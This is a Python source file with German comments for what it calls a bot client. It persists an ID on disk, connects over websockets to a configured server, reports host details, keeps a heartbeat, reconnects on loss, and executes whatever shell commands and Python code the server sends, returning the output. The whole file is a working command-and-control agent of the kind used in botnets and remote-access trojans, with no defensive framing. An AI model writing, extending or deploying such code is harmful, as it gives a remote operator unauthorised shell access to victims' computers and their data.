import asyncio
import websockets
import json
import uuid
import platform
import psutil
import os
import subprocess
from config import SERVER_URL, RECONNECT_DELAY

# Bot ID persistent machen
BOT_ID_FILE = "bot_id.txt"

if os.path.exists(BOT_ID_FILE):
    with open(BOT_ID_FILE, "r") as f:
        BOT_ID = f.read().strip()
else:
    BOT_ID = str(uuid.uuid4())[:8]
    with open(BOT_ID_FILE, "w") as f:
        f.write(BOT_ID)

async def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "cpu_cores": psutil.cpu_count(logical=False),
        "cpu_threads": psutil.cpu_count(logical=True),
        "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "python": platform.python_version(),
        "cwd": os.getcwd()
    }

async def execute_shell(command: str):
    # execute shell command
    if not command:
        return {"error": "No command specified"}
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
            "command": command
        }
    except subprocess.TimeoutExpired:
        return {"error": "Timeout after 60 seconds"}
    except Exception as e:
        return {"error": str(e)}

async def execute_python(code: str):
    # execute python code
    try:
        local_vars = {}
        exec(code, {"__builtins__": {}}, local_vars)
        return {"status": "executed", "result": str(list(local_vars.keys())[-5:]) if local_vars else "ok"}
    except Exception as e:
        return {"error": str(e)}

async def send_heartbeat(ws):
    while True:
        try:
            await ws.send(json.dumps({"type": "heartbeat", "bot_id": BOT_ID}))
            await asyncio.sleep(20)
        except:
            break

async def client():
    while True:
        try:
            async with websockets.connect(SERVER_URL) as ws:
                print(f"[{BOT_ID}] Connected with server")

                # Registrieren
                await ws.send(json.dumps({
                    "type": "register",
                    "bot_id": BOT_ID,
                    "info": await get_system_info()
                }))

                # Heartbeat starten
                heartbeat_task = asyncio.create_task(send_heartbeat(ws))

                async for message in ws:
                    data = json.loads(message)

                    if data["type"] == "command":
                        task_id = data.get("task_id")
                        cmd = data["data"]
                        cmd_type = cmd.get("type")
                        payload = cmd.get("payload")

                        result = None

                        if cmd_type == "ping":
                            result = "pong"
                        elif cmd_type == "system_info":
                            result = await get_system_info()
                        elif cmd_type == "shell":
                            result = await execute_shell(payload)
                        elif cmd_type == "python":
                            result = await execute_python(payload)
                        else:
                            result = f"Unbekannter Befehl: {cmd_type}"

                        await ws.send(json.dumps({
                            "type": "result",
                            "bot_id": BOT_ID,
                            "task_id": task_id,
                            "data": result
                        }))

        except Exception as e:
            print(f"[{BOT_ID}] Connection lost: {e}")
            if 'heartbeat_task' in locals():
                heartbeat_task.cancel()
            await asyncio.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    print(f"Client started - ID: {BOT_ID}")
    asyncio.run(client())